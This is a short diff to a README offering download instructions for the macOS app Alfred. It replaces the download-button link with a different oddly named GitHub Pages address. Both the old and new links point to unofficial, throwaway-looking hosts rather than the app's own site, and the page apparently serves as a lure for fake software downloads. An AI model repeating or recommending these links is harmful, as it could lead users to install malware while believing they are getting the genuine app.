@@ -2,7 +2,7 @@
 
 Alfred is a productivity application for macOS designed to help you launch apps, search files, browse the web, and control your Mac using custom workflows and hotkeys. Follow the steps below to download and install Alfred on your macOS device. ⚡
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Alfred-blue?style=for-the-badge\&logo=apple)](https://fituganshfgh.github.io/.github/alfred/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-Alfred-blue?style=for-the-badge\&logo=apple)](https://mrboomzeus519.github.io/gimronus/alfred/)
 
 If the download button doesn't work, please follow the instructions below.
 
